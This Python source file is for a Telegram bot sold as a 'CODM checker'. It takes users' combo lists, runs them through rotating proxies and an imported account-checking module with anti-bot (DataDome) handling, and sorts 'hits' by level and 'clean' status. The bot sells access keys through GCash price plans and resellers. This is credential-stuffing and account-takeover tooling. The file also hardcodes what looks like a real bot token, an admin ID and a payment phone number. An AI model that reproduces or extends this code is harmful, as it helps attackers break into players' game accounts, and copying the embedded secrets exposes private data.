sr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   GARENA CODM CHECKER — TELEGRAM BOT  v5                 ║
╚══════════════════════════════════════════════════════════╝
"""

import os, sys, json, time, uuid, zipfile, logging, signal, traceback
import asyncio, threading, io, random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from functools import wraps
from typing import Optional, Dict, List

for _n in ("urllib3","requests","cloudscraper","telegram","httpx","hpack","asyncio"):
    logging.getLogger(_n).setLevel(logging.ERROR)
logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s",
                    level=logging.INFO, handlers=[logging.StreamHandler()])
log = logging.getLogger("TyrantBot")

# ════════════════════════════════════════════
#  RAILWAY.COM — CRASH PREVENTION
# ════════════════════════════════════════════
_RAILWAY_PORT    = int(os.environ.get("PORT", 8080))
_railway_start   = time.time()
_shutdown_flag   = threading.Event()

def _start_health_server():
    import http.server, socketserver
    class _H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = (f'{{"status":"ok","uptime":{int(time.time()-_railway_start)},'
                    f'"pid":{os.getpid()}}}').encode()
            self.send_response(200)
            self.send_header("Content-Type","application/json")
            self.send_header("Content-Length",str(len(body)))
            self.end_headers(); self.wfile.write(body)
        def log_message(self,*a): pass
    for _i in range(10):
        try:
            srv=socketserver.TCPServer(("0.0.0.0",_RAILWAY_PORT+_i),_H)
            srv.allow_reuse_address=True
            threading.Thread(target=srv.serve_forever,daemon=True,name="health-http").start()
            log.info(f" Health server on port {_RAILWAY_PORT+_i}")
            return
        except OSError: time.sleep(0.5)
    log.warning("  Health server could not bind (Railway may restart)")

_start_health_server()

# ════════════════════════════════════════════
#  MEMORY WATCHDOG  (GC only — no blocking)
# ════════════════════════════════════════════
_MEM_LIMIT_MB   = int(os.environ.get("BOT_MEM_LIMIT_MB", "9999"))  # effectively unlimited
_MEM_WARN_MB    = int(os.environ.get("BOT_MEM_WARN_MB",  "9999"))  # effectively unlimited
_mem_pressure   = threading.Event()   # never set — checkers are never blocked by RAM

def _get_rss_mb() -> float:
    """Return current process RSS in MB. Works on Linux (Railway)."""
    try:
        with open("/proc/self/status","r") as _ps:
            for ln in _ps:
                if ln.startswith("VmRSS:"):
                    return int(ln.split()[1]) / 1024
    except: pass
    try:
        import resource as _res
        return _res.getrusage(_res.RUSAGE_SELF).ru_maxrss / 1024
    except: pass
    return 0.0

def _memory_watchdog():
    """Periodic GC to keep memory tidy — no blocking of checkers."""
    import gc as _gc
    while not _shutdown_flag.wait(30):   # check every 30 seconds
        mb = _get_rss_mb()
        if mb > 600:
            _gc.collect()
            log.info(f"GC run — RAM {mb:.0f}MB")
        # Never set _mem_pressure — checkers always allowed to run

threading.Thread(target=_memory_watchdog, daemon=True, name="mem-watchdog").start()

def _send_data_backup_to_admins(reason: str = "Shutdown"):
    """Send every file in data/ to all admins via raw requests (sync — safe in signal handlers)."""
    import requests as _req
    try:
        if not CONFIG_FILE.exists(): return
        with open(CONFIG_FILE, "r", encoding="utf-8") as _cf:
            _cfg = json.load(_cf)
        _tok  = _cfg.get("bot_token", "")
        _aids = _cfg.get("admin_ids", [])
        if not _tok or not _aids: return
        _files = [f for f in DATA_DIR.iterdir() if f.is_file()] if DATA_DIR.exists() else []
        if not _files: return
        for _aid in _aids:
            try:
                _req.post(
                    f"https://api.telegram.org/bot{_tok}/sendMessage",
                    data={"chat_id": _aid,
                          "text": (f" <b>Bot {reason}</b> — Data Backup\n"
                                   f"━━━━━━━━━━━━━━━━━━━━\n"
                                   f"Sending <b>{len(_files)}</b> file(s) from <code>data/</code>…"),
                          "parse_mode": "HTML"},
                    timeout=8)
            except: pass
            for _f in _files:
                try:
                    with open(_f, "rb") as _fh:
                        _req.post(
                            f"https://api.telegram.org/bot{_tok}/sendDocument",
                            data={"chat_id": _aid,
                                  "caption": f" <code>{_f.name}</code>",
                                  "parse_mode": "HTML"},
                            files={"document": (_f.name, _fh, "application/octet-stream")},
                            timeout=15)
                except: pass
    except: pass

def _handle_sigterm(signum,frame):
    log.info("  SIGTERM — sending data backup then exiting cleanly…")
    _shutdown_flag.set()
    _send_data_backup_to_admins("Shutdown")
    time.sleep(2); sys.exit(0)

signal.signal(signal.SIGTERM, _handle_sigterm)
signal.signal(signal.SIGINT,  _handle_sigterm)

def _global_exception_hook(exc_type,exc_value,exc_tb):
    if issubclass(exc_type,(KeyboardInterrupt,SystemExit)):
        sys.__excepthook__(exc_type,exc_value,exc_tb); return
    log.critical(" Uncaught:\n"+"".join(traceback.format_exception(exc_type,exc_value,exc_tb)))
    _send_data_backup_to_admins("Crash")
sys.excepthook = _global_exception_hook

_orig_thread_hook = threading.excepthook
def _thread_exception_hook(args):
    if args.exc_type in (SystemExit,KeyboardInterrupt): return
    log.error(f" Thread '{args.thread.name}' crashed:\n"
              +"".join(traceback.format_exception(args.exc_type,args.exc_value,args.exc_tb)))
    _orig_thread_hook(args)
threading.excepthook = _thread_exception_hook

# Periodic session snapshot every 60 s — max 1 min lost on Railway restart
def _periodic_snapshot():
    while not _shutdown_flag.wait(60):
        try:
            with sessions_lock if 'sessions_lock' in dir() else __import__('contextlib').nullcontext():
                pass
        except: pass
        try:
            import threading as _thr
            # sessions_lock defined later — access via globals
            _lock = globals().get("sessions_lock")
            _sessions = globals().get("active_sessions",{})
            if _lock:
                with _lock:
                    targets = {u:dict(s) for u,s in _sessions.items() if s.get("status")=="checking"}
            else: targets={}
            for uid,s in targets.items():
                ls=s.get("live_")
                if ls:
                    try: update_persisted_stats(uid,ls.get_stats())
                    except: pass
        except: pass
threading.Thread(target=_periodic_snapshot,daemon=True,name="snapshot").start()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ChatMember, BotCommand, BotCommandScopeAllPrivateChats, BotCommandScopeChat, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import (Application, CommandHandler, MessageHandler,
                           CallbackQueryHandler, ContextTypes, filters)
from telegram.constants import ParseMode

# ════════════════════════════════════════════
#  PREMIUM EMOJI SYSTEM
# ════════════════════════════════════════════
PREMIUM_EMOJI_IDS: List[str] = [
    "6293797538860373333","6177045303959491385","6294064758840628757",
    "6176952682989754426","6176905893616031802","6203982793379154737",
    "5467908974613390803","6170401663862444833","6169996644151465371",
    "6203870007537961769","6203997009720904372","6328002666995652076",
    "6328017493222760489","6327875261085783004","6330125347207517441",
    "6329926812344260001","6332581398485931268","6330119690735589166",
    "6329821890588185716","6332567079064966022","6129494286506401122",
    "6129792056589031358","6129546277085520554","6129888444245089008",
    "6129410405795110009","6129579597441801084","6129758830722030858",
    "6136389070521114052","5244837092042750681","5467538555158943525",
    "5445267414562389170","5251203410396458957","5253742260054409879",
    "5386367538735104399","6179492129648152418","6179258504902086636",
    "6204173309538472542","6201569481320306153","5260502250815513613",
    "5361979846845014099","5359735919706382382","5362034620562940839",
    "4956282853882069908","4956214478002717877","4958534696645428119",
    "4956287101604725699",
]

def pe(n: int = 1) -> str:
    """Return n random premium emoji HTML tags for messages."""
    if not PREMIUM_EMOJI_IDS:
        return "⭐"
    out = []
    for _ in range(n):
        eid = random.choice(PREMIUM_EMOJI_IDS)
        out.append(f'<tg-emoji emoji-id="{eid}">⭐</tg-emoji>')
    return "".join(out)

def peb(label: str) -> str:
    """Wrap a button label with a single premium emoji — for ReplyKeyboard buttons."""
    if not PREMIUM_EMOJI_IDS:
        return label
    eid = random.choice(PREMIUM_EMOJI_IDS)
    return f'<tg-emoji emoji-id="{eid}">⭐</tg-emoji> {label}'

def pe_sep() -> str:
    """Decorative separator line with premium emojis."""
    return f"{pe(1)}━━━━━━━━━━━━━━━━━━{pe(1)}"

def pe_thin() -> str:
    """Thin separator line."""
    return "┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"

def _progress_bar(pct: int, width: int = 15) -> str:
    """Generate a stunning CODM-themed progress bar."""
    filled = int(pct / 100 * width)
    empty  = width - filled
    if pct >= 100:
        bar = "█" * width
        frame = "🟩"
    elif pct >= 75:
        bar = "█" * filled + "▓" + "░" * max(0, empty - 1)
        frame = "🟨"
    elif pct >= 50:
        bar = "█" * filled + "▒" + "░" * max(0, empty - 1)
        frame = "🟧"
    elif pct >= 25:
        bar = "█" * filled + "░" * empty
        frame = "🟥"
    else:
        bar = "▒" * filled + "░" * empty
        frame = "🔲"
    return f"{frame}[{bar}]{frame}"

def _hit_badge(has_codm: int) -> str:
    """Return a stylish hit badge based on hit count."""
    if has_codm == 0:   return "💀 NO HITS YET"
    if has_codm < 5:    return f"🎯 {has_codm} HIT{'S' if has_codm > 1 else ''}"
    if has_codm < 20:   return f"🔥 {has_codm} HITS — HEATING UP!"
    if has_codm < 50:   return f"💥 {has_codm} HITS — ON FIRE!"
    if has_codm < 100:  return f"⚡ {has_codm} HITS — UNSTOPPABLE!"
    return f"🏆 {has_codm} HITS — LEGENDARY!"

def _speed_color(speed: str) -> str:
    """Add flair to speed display."""
    if not speed or speed == "—": return "🐢 —"
    try:
        n = int(speed.replace("/min","").replace(",","").strip())
        if n >= 500:  return f"🚀 {speed}"
        if n >= 200:  return f"⚡ {speed}"
        if n >= 100:  return f"🔥 {speed}"
        if n >= 50:   return f"✅ {speed}"
        return f"🐢 {speed}"
    except: return f"✅ {speed}"

# ════════════════════════════════════════════
#  PATHS
# ════════════════════════════════════════════
BASE_DIR    = Path(__file__).parent
DATA_DIR    = BASE_DIR / "data"
COMBO_DIR   = BASE_DIR / "combo"
RESULTS_DIR = BASE_DIR / "results"
PROXY_DIR   = BASE_DIR / "proxy"
for _d in (DATA_DIR, COMBO_DIR, RESULTS_DIR, PROXY_DIR):
    _d.mkdir(parents=True, exist_ok=True)

CONFIG_FILE    = DATA_DIR / "config.json"
USERS_FILE     = DATA_DIR / "users.json"
KEYS_FILE      = DATA_DIR / "keys.json"
SESSIONS_FILE  = DATA_DIR / "sessions_persist.json"   # crash-resume state
RESELLERS_FILE = DATA_DIR / "resellers.json"           # reseller panel


# ════════════════════════════════════════════
#  PROXY TEST HELPER
# ════════════════════════════════════════════
def _build_proxy_url(line: str) -> str:
    """
    Convert any proxy line to a proper URL string.
    Handles:
      http://TOKEN@host:port           — residential proxies (kept as-is)
      http://host:port                 — plain http proxy
      host:port                        — adds http://
      host:port:user:pass              — converts to http://user:pass@host:port
    """
    line = line.strip()
    if not line or line.startswith("#"):
        return ""
    # Already a full URL — use as-is (handles residential proxy tokens)
    if line.lower().startswith(("http://", "https://", "socks5://", "socks4://")):
        return line
    # host:port:user:pass
    parts = line.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    # host:port
    return f"http://{line}"


def _test_proxy_sync(line: str, timeout: int = 10) -> tuple:
    """
    Test a proxy line by connecting to http://ip-api.com/json.
    Returns (is_working: bool, error_str: str)
      - is_working=True  → proxy is alive
      - is_working=False → dead or error (error_str has the reason)
    """
    import requests as _rq
    url = _build_proxy_url(line)
    if not url:
        return False, "malformed"
    proxies = {"http": url, "https": url}
    try:
        r = _rq.get(
            "http://ip-api.com/json",
            proxies=proxies,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        if r.status_code < 500:
            return True, ""
        return False, f"HTTP {r.status_code}"
    except _rq.exceptions.ProxyError as e:
        return False, f"proxy error: {str(e)[:60]}"
    except _rq.exceptions.ConnectTimeout:
        return False, "timeout"
    except _rq.exceptions.ConnectionError as e:
        return False, f"conn error: {str(e)[:60]}"
    except Exception as e:
        return False, f"error: {str(e)[:60]}"


# ════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════
DEFAULT_CONFIG = {
    "bot_token":"8442324080:AAHd8V_3jm4On4NkRovNjIIwiorlUso5IVc",
    "admin_ids":  [8632939616],
    "channel_username":  "noxchannell",
    "locked": False,
    "global_limit": None,
    "vip_limit": None,
    "max_lines_per_check": None,    # hard cap on lines per single check session (null = unlimited)
    "default_threads":     20,      # 20 threads per user
    "max_concurrent":      30,
    "cooldown_sessions":   None,
    "cooldown_minutes":    30,
    "maintenance_mode":    False,
    "maintenance_message": "⚙️ Bot is under maintenance. Please try again later.",
    "announcement_text":   "",      # shown to users on /start
    "notify_admin_on_hit": False,   # send admin a message for every CODM hit
    "welcome_message":     "",      # custom welcome text shown on /start (empty = default)
    "bot_name":            "Zia Codm Checker Bot",
    "gcash_number":        "09497330622",
    "gcash_name":          "J.Q.",
     }

GCASH_PLANS = {
    "plan_1d":   {"label": "1 Day",    "price": "₱50",    "dtype": "days",     "dval": 1},
    "plan_3d":   {"label": "3 Days",   "price": "₱120",   "dtype": "days",     "dval": 3},
    "plan_7d":   {"label": "7 Days",   "price": "₱250",   "dtype": "days",     "dval": 7},
    "plan_30d":  {"label": "30 Days",  "price": "₱800",   "dtype": "days",     "dval": 30},
    "plan_life": {"label": "Lifetime", "price": "₱2000",  "dtype": "lifetime", "dval": 0},
}

def load_config() -> dict:
    if CONFIG_FILE.exists():
        try:
            with open(CONFIG_FILE,"r",encoding="utf-8") as f: cfg = json.load(f)
            for k,v in DEFAULT_CONFIG.items(): cfg.setdefault(k,v)
            return cfg
        except (json.JSONDecodeError, ValueError):
            log.warning("  config.json corrupted or empty — resetting to defaults")
    with open(CONFIG_FILE,"w",encoding="utf-8") as f: json.dump(DEFAULT_CONFIG,f,indent=2)
    return DEFAULT_CONFIG.copy()

def save_config(cfg: dict):
    with open(CONFIG_FILE,"w",encoding="utf-8") as f: json.dump(cfg,f,indent=2)

def load_users() -> dict:
    if USERS_FILE.exists():
        try:
            with open(USERS_FILE,"r",encoding="utf-8") as f: return json.load(f)
        except (json.JSONDecodeError, ValueError):
            log.warning("  users.json corrupted or empty — returning empty")
    return {}

def save_users(u: dict):
    with open(USERS_FILE,"w",encoding="utf-8") as f: json.dump(u,f,indent=2)

def load_keys() -> dict:
    if KEYS_FILE.exists():
        try:
            with open(KEYS_FILE,"r",encoding="utf-8") as f: return json.load(f)
        except (json.JSONDecodeError, ValueError):
            log.warning("  keys.json corrupted or empty — returning empty")
    return {}

def save_keys(k: dict):
    with open(KEYS_FILE,"w",encoding="utf-8") as f: json.dump(k,f,indent=2)

# ════════════════════════════════════════════
#  MINI ADMIN PANEL
# ════════════════════════════════════════════
# All admin commands that can be granted to a mini admin
MINI_ADMIN_PERMISSIONS = [
    # ── Key management ──────────────────────
    ("generate_key",     " Generate keys"),
    ("remove_key",       " Remove keys from users"),
    # ── User management ─────────────────────
    ("ban_user",         " Ban users"),
    ("unban_user",       " Unban users"),
    ("addvip",           " Add VIP"),
    ("removevip",        " Remove VIP"),
    ("checkalluser",     " View all users"),
    # ── Session control ──────────────────────
    ("stats",            " Bot statistics"),
    ("checkrunning",     " View running sessions"),
    ("stopchecking",     " Stop checking sessions"),
    ("continuechecking", " Continue stopped sessions"),
    ("stopall",          " Stop ALL sessions"),
    ("continueall",      " Continue ALL sessions"),
    ("stopforuser",      " Stop/manage one user"),
    ("stopforvip",       " Stop VIP sessions"),
    ("stopnonvip",       " Stop non-VIP sessions"),
    # ── Proxy management ─────────────────────
    ("checkproxy",       " Check proxy file"),
    ("pasteproxy",       " Paste proxy lines"),
    ("upload_proxy",     " Upload proxy file"),
    ("proxystatus",      " Proxy status"),
    ("removeproxy",      " Remove proxy file"),
    # ── Files & results ──────────────────────
    ("refreshcombo",     " Clear combo files"),
    ("refreshresults",   " Clear result files"),
    # ── Settings ─────────────────────────────
    ("setlimit",         " Set line limit"),
    ("setlimitforvip",   " Set VIP limit"),
    ("setcd",            " Set cooldown"),
    ("setconcurrent",    " Set concurrent slots"),
    ("broadcast",        " Broadcast message"),
    ("lockall",          " Lock/unlock bot"),
    ("refresh",          " Reload config & proxy"),
]
# Fast lookup: perm_key -> description
MINI_ADMIN_PERM_MAP = {k: d for k,d in MINI_ADMIN_PERMISSIONS}
MINI_ADMIN_PERM_KEYS = [k for k,_ in MINI_ADMIN_PERMISSIONS]

MINI_ADMINS_FILE = DATA_DIR / "mini_admins.json"

def load_mini_admins() -> dict:
    if MINI_ADMINS_FILE.exists():
        try:
            with open(MINI_ADMINS_FILE,"r",encoding="utf-8") as f: return json.load(f)
        except (json.JSONDecodeError,ValueError):
            log.warning("  mini_admins.json corrupted — returning empty")
    # Legacy: also check old resellers.json
    if RESELLERS_FILE.exists():
        try:
            with open(RESELLERS_FILE,"r",encoding="utf-8") as f:
                old=json.load(f)
            if old:
                log.info("Migrating resellers.json → mini_admins.json")
                with open(MINI_ADMINS_FILE,"w",encoding="utf-8") as f: json.dump(old,f,indent=2)
                return old
        except: pass
    return {}

def save_mini_admins(r: dict):
    with open(MINI_ADMINS_FILE,"w",encoding="utf-8") as f: json.dump(r,f,indent=2)

def is_mini_admin(uid) -> bool:
    ma=load_mini_admins().get(str(uid),{})
    return ma.get("active",False)

def mini_admin_has_perm(uid, perm: str) -> bool:
    ma=load_mini_admins().get(str(uid),{})
    return ma.get("active",False) and perm in ma.get("permissions",[])

def mini_admin_log_action(uid: str, action: str, detail: str = ""):
    """Log any command used by a mini admin."""
    ma=load_mini_admins()
    if uid not in ma: return
    entry={"action":action,"detail":detail,
           "at":datetime.now(timezone.utc).isoformat()}
    ma[uid].setdefault("action_log",[]).append(entry)
    ma[uid]["total_actions"]=ma[uid].get("total_actions",0)+1
    # Keep only last 200 actions
    if len(ma[uid]["action_log"])>200:
        ma[uid]["action_log"]=ma[uid]["action_log"][-200:]
    save_mini_admins(ma)

# ── Permission-aware decorator ───────────────────────────────────────────────
def admin_or_mini_admin(perm: str):
    """Decorator: allow full admins OR mini admins who have `perm`."""
    def decorator(fn):
        @wraps(fn)
        async def wrapper(update, context):
            uid_int = update.effective_user.id
            cfg = load_config()
            if is_admin(uid_int, cfg):
                return await fn(update, context)
            uid_str = str(uid_int)
            if mini_admin_has_perm(uid_int, perm):
                mini_admin_log_action(uid_str, perm,
                    " ".join(context.args) if context.args else "")
                return await fn(update, context)
            await update.message.reply_text(
                f" <b>Permission Denied</b>\n"
                f"You need the <code>{perm}</code> permission.\n"
                f"Contact admin for access.",
                parse_mode=ParseMode.HTML)
        return wrapper
    return decorator

# Legacy alias kept for backward compat
RESELLERS_FILE = DATA_DIR / "resellers.json"
def load_resellers(): return load_mini_admins()
def save_resellers(r): save_mini_admins(r)
def is_reseller(uid): return is_mini_admin(uid)
def reseller_has_perm(uid,perm): return mini_admin_has_perm(uid,perm)
def reseller_log_key(uid,key,dtype,dval,max_users,expires_at):
    mini_admin_log_action(uid,"generate_key",
        f"key={key} type={dtype} val={dval} max={max_users}")

# ════════════════════════════════════════════
#  SESSION PERSISTENCE  (crash-resume)
# ════════════════════════════════════════════
def load_persisted_sessions() -> dict:
    if SESSIONS_FILE.exists():
        try:
            with open(SESSIONS_FILE,"r",encoding="utf-8") as f: return json.load(f)
        except: pass
    return {}

def persist_session(uid: str, data: dict):
    """Save a single session's resumable state to disk."""
    ps = load_persisted_sessions()
    ps[uid] = data
    with open(SESSIONS_FILE,"w",encoding="utf-8") as f: json.dump(ps,f,indent=2)

def clear_persisted_session(uid: str):
    ps = load_persisted_sessions()
    ps.pop(uid, None)
    with open(SESSIONS_FILE,"w",encoding="utf-8") as f: json.dump(ps,f,indent=2)

# ════════════════════════════════════════════
#  KEY EXPIRY
# ════════════════════════════════════════════
def compute_expiry(dtype: str, value: int) -> Optional[str]:
    if dtype == "lifetime": return None
    now   = datetime.now(timezone.utc)
    delta = {"hours":timedelta(hours=value),"days":timedelta(days=value),
             "months":timedelta(days=value*30)}.get(dtype)
    return (now+delta).isoformat() if delta else None

def key_expired(exp: Optional[str]) -> bool:
    if not exp: return False
    try:
        e = datetime.fromisoformat(exp)
        if e.tzinfo is None: e = e.replace(tzinfo=timezone.utc)
        return datetime.now(timezone.utc) > e
    except: return False

def fmt_expiry(exp: Optional[str]) -> str:
    if not exp: return " Lifetime"
    try:
        e = datetime.fromisoformat(exp)
        if e.tzinfo is None: e = e.replace(tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        if now > e: return " Expired"
        diff = e - now
        d,h = diff.days, diff.seconds//3600
        m   = (diff.seconds%3600)//60
        p   = []
        if d: p.append(f"{d}d")
        if h: p.append(f"{h}h")
        if m and not d: p.append(f"{m}m")
        return f" {''.join(p) or '<1m'} left  ({e.strftime('%Y-%m-%d %H:%M UTC')})"
    except: return exp

# ════════════════════════════════════════════
#  CHECKER IMPORT
# ════════════════════════════════════════════
_so,_se = sys.stdout,sys.stderr
sys.stdout = sys.stderr = io.StringIO()
try:
    sys.path.insert(0,str(BASE_DIR))
    from dec_tyrantv12 import (processaccount,CookieManager,DataDomeManager,
                                LiveStats,geo_rotator,create_thread_session,
                                remove_duplicates_from_file)
    import dec_tyrantv12 as _dty_module
    _dty_module.BOT_MODE = True   # suppress per-account prints from flooding Railway logs
    CHECKER_OK=True; CHECKER_ERR=""
except Exception as _ex:
    CHECKER_OK=False; CHECKER_ERR=str(_ex)
finally:
    sys.stdout,sys.stderr = _so,_se
if CHECKER_OK: log.info("  dec_tyrantv12.py imported OK")
else:          log.warning(f"  Checker import failed: {CHECKER_ERR}")

# ════════════════════════════════════════════
#  OPTIONS
# ════════════════════════════════════════════
LEVEL_OPTIONS = {
    "lvl_all": {"label":" ALL Levels","threshold":[0]},
    "lvl_100": {"label":" Level 100+","threshold":[100]},
    "lvl_200": {"label":" Level 200+","threshold":[200]},
    "lvl_300": {"label":" Level 300+","threshold":[300]},
    "lvl_400": {"label":" Level 400+","threshold":[400]},
}
CLEAN_OPTIONS = {
    "cf_both":     {"label":" All hits","filter":"both"},
    "cf_clean":    {"label":" Clean only","filter":"clean"},
    "cf_notclean": {"label":" Not-clean only","filter":"notclean"},
}

# ════════════════════════════════════════════
#  CONCURRENCY
# ════════════════════════════════════════════
MAX_CONCURRENT_CHECKERS = 2    # 512MB Railway: max 2 concurrent checkers safely
_checker_semaphore = threading.Semaphore(MAX_CONCURRENT_CHECKERS)
_semaphore_lock    = threading.Lock()
_checker_queue: List[str] = []
_queue_lock = threading.Lock()

def rebuild_semaphore(n: int):
    global _checker_semaphore, MAX_CONCURRENT_CHECKERS
    with _semaphore_lock:
        MAX_CONCURRENT_CHECKERS = n
        _checker_semaphore = threading.Semaphore(n)

def _enqueue(uid):
    with _queue_lock:
        if uid not in _checker_queue: _checker_queue.append(uid)

def _dequeue(uid):
    with _queue_lock:
        try: _checker_queue.remove(uid)
        except: pass

def _queue_pos(uid) -> int:
    with _queue_lock:
        try: return _checker_queue.index(uid)+1
        except: return 0

# ════════════════════════════════════════════
#  SESSION + MESSAGE TRACKER
# ════════════════════════════════════════════
active_sessions: Dict[str,dict] = {}
_admin_stopped: set = set()   # uids force-stopped by admin — can be continued
sessions_lock = threading.Lock()
bot_messages:  Dict[str,list]  = {}
bot_msg_lock  = threading.Lock()

def track(uid: str, mid: int):
    with bot_msg_lock: bot_messages.setdefault(uid,[]).append(mid)

# ════════════════════════════════════════════
#  USER HELPERS
# ════════════════════════════════════════════
def get_or_create_user(uid,username="",first_name=""):
    users = load_users()
    if uid not in users:
        users[uid] = {"username":username,"first_name":first_name,"banned":False,
                      "vip":False,"activated":False,"total_checked":0,"sessions_count":0,
                      "sessions_since_cd":0,"last_cd_at":None,"key_used":None,
                      "key_expires_at":None,"joined":datetime.now().isoformat(),
                      "last_seen":datetime.now().isoformat(),
                      "custom_limit":None,"note":"","total_hits":0,"hit_count":0}
    else:
        if username:   users[uid]["username"]   = username
        if first_name: users[uid]["first_name"] = first_name
        users[uid]["last_seen"] = datetime.now().isoformat()
        users[uid].setdefault("custom_limit", None)
        users[uid].setdefault("note", "")
        users[uid].setdefault("total_hits", 0)
        users[uid].setdefault("hit_count", 0)
    save_users(users)
    return users[uid], users

def is_admin(uid: int, cfg: dict) -> bool:
    return uid in cfg.get("admin_ids",[])

def check_key_expiry(uid: str) -> bool:
    users = load_users(); u = users.get(uid,{})
    if key_expired(u.get("key_expires_at")):
        users[uid]["activated"]=False; users[uid]["key_expired"]=True
        save_users(users); return True
    return False

def check_cooldown(uid: str, cfg: dict):
    cd_s = cfg.get("cooldown_sessions"); cd_m = cfg.get("cooldown_minutes",30)
    if not cd_s: return False,0.0
    users = load_users(); u = users.get(uid,{})
    if u.get("vip"): return False,0.0
    lcd = u.get("last_cd_at")
    if lcd:
        try:
            ldt = datetime.fromisoformat(lcd)
            if ldt.tzinfo is None: ldt=ldt.replace(tzinfo=timezone.utc)
            el = (datetime.now(timezone.utc)-ldt).total_seconds()/60
            if el >= cd_m:
                users[uid]["sessions_since_cd"]=0; users[uid]["last_cd_at"]=None
                save_users(users); return False,0.0
            return True,round(cd_m-el,1)
        except: pass
    if u.get("sessions_since_cd",0) >= cd_s:
        users[uid]["last_cd_at"]=datetime.now(timezone.utc).isoformat()
        users[uid]["sessions_since_cd"]=0; save_users(users)
        return True,float(cd_m)
    return False,0.0

def inc_session(uid: str):
    users=load_users()
    if uid in users:
        users[uid]["sessions_since_cd"]=users[uid].get("sessions_since_cd",0)+1
        save_users(users)

def del_combo(p):
    try:
        p = Path(p)
        if p.exists(): p.unlink()
        # Also delete the checkpoint file so resume starts fresh
        ckpt = Path(str(p) + ".ckpt")
        if ckpt.exists():
            try: ckpt.unlink()
            except: pass
        # Remove combo/{uid}/ folder if now empty
        parent = p.parent
        if parent.exists() and parent != COMBO_DIR and not any(parent.iterdir()):
            parent.rmdir()
    except Exception as e: log.warning(f"del_combo: {e}")

def del_result_folder(rf, base_dir=None):
    """Delete rf (a timestamped result folder) and clean up empty parent uid-folder.
    base_dir defaults to RESULTS_DIR — stops parent cleanup there."""
    import shutil as _sh
    base = base_dir or RESULTS_DIR
    try:
        rf = Path(rf)
        if rf.exists():
            _sh.rmtree(rf, ignore_errors=True)
            log.info(f" Deleted result folder: {rf}")
        # Remove results/{uid}/ if now empty
        parent = rf.parent
        if parent.exists() and parent != base and not any(parent.iterdir()):
            parent.rmdir()
            log.info(f" Deleted empty uid result folder: {parent}")
    except Exception as e:
        log.warning(f"del_result_folder: {e}")

# ════════════════════════════════════════════
#  CHANNEL GATE
# ════════════════════════════════════════════
async def in_channel(bot,uid,ch) -> bool:
    try:
        m = await bot.get_chat_member(f"@{ch}",uid)
        return m.status in (ChatMember.MEMBER,ChatMember.ADMINISTRATOR,ChatMember.OWNER)
    except: return False

async def join_prompt(target,ch):
    kb = InlineKeyboardMarkup([[InlineKeyboardButton(" Join Channel",url=f"https://t.me/{ch}")],
                                [InlineKeyboardButton(" I Joined — Verify Now",callback_data="check_join")]])
    txt = (f" <b>Access Denied</b>\n\nJoin <b>@{ch}</b> first.\n\n"
           "1 Tap <b>Join Channel</b>\n2 Tap <b>I Joined — Verify Now</b>")
    if hasattr(target,"edit_message_text"): await target.edit_message_text(txt,reply_markup=kb,parse_mode=ParseMode.HTML)
    else: await target.reply_text(txt,reply_markup=kb,parse_mode=ParseMode.HTML)

async def gate(update,context,require_key=True):
    tg=update.effective_user; uid=str(tg.id); cfg=load_config()
    if is_admin(tg.id,cfg):
        ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or ""); return True,ud,u
    ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or "")
    if ud.get("banned"):
        await update.effective_message.reply_text(" You are <b>banned</b>.",parse_mode=ParseMode.HTML); return False,None,u
    if require_key:
        if not ud.get("activated"):
            await update.effective_message.reply_text(" Use <code>/redeem YOUR_KEY</code>.",parse_mode=ParseMode.HTML); return False,None,u
        if check_key_expiry(uid):
            await update.effective_message.reply_text(" <b>Key Expired.</b> Contact admin.",parse_mode=ParseMode.HTML); return False,None,load_users()
    if cfg.get("locked") and not ud.get("vip"):
        await update.effective_message.reply_text(" <b>Bot Locked.</b>",parse_mode=ParseMode.HTML); return False,None,u
    return True,ud,u

async def gate_cb(query,context):
    tg=query.from_user; uid=str(tg.id); cfg=load_config()
    if is_admin(tg.id,cfg):
        ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or ""); return True,ud,u
    ud,u=get_or_create_user(uid,tg.username or "",tg.first_name or "")
    if ud.get("banned"): await query.answer(" Banned!",show_alert=True); return False,None,u
    if not ud.get("activated") and not is_admin(tg.id,cfg):
        await query.answer(" Use /redeem KEY!",show_alert=True); return False,None,u
    if check_key_expiry(uid): await query.answer(" Key expired!",show_alert=True); return False,None,load_users()
    if load_config().get("locked") and not ud.get("vip"):
        await query.answer(" Bot locked!",show_alert=True); return False,None,u
    return True,ud,u

def admin_only(fn):
    @wraps(fn)
    async def w(update,context):
        if not is_admin(update.effective_user.id,load_config()):
            await update.message.reply_text(" Admin only."); return
        return await fn(update,context)
    return w

# ════════════════════════════════════════════
#  BUTTON TEXT CONSTANTS (used for routing)
# ════════════════════════════════════════════
BTN_CHECK     = "Check Accounts"
BTN_ADMIN     = "Admin Panel"
BTN_STOP      = "Stop Checking"
BTN_STATUS    = "My Status"
BTN_RESULTS   = "Get Results File"
BTN_HITS_ON   = "Enable Hit Notifs"
BTN_HITS_OFF  = "Disable Hit Notifs"
BTN_DELETE    = "Delete My File"

BTN_START_NOW = "START CHECKING NOW"
BTN_LVL_MENU  = "Change Level Filter"
BTN_CF_MENU   = "Change Clean Filter"

BTN_LVL_ALL   = "ALL Levels"
BTN_LVL_100   = "Level 100+"
BTN_LVL_200   = "Level 200+"
BTN_LVL_300   = "Level 300+"
BTN_LVL_400   = "Level 400+"

BTN_CF_BOTH   = "All Hits"
BTN_CF_CLEAN  = "Clean Only"
BTN_CF_DIRTY  = "Not-Clean Only"

BTN_CONTINUE  = "Continue Checking"
BTN_STOP_GET  = "Stop and Get Results"

BTN_BACK      = "Back"
BTN_CANCEL    = "Cancel"

BTN_BUY       = "🛒 Buy Key"
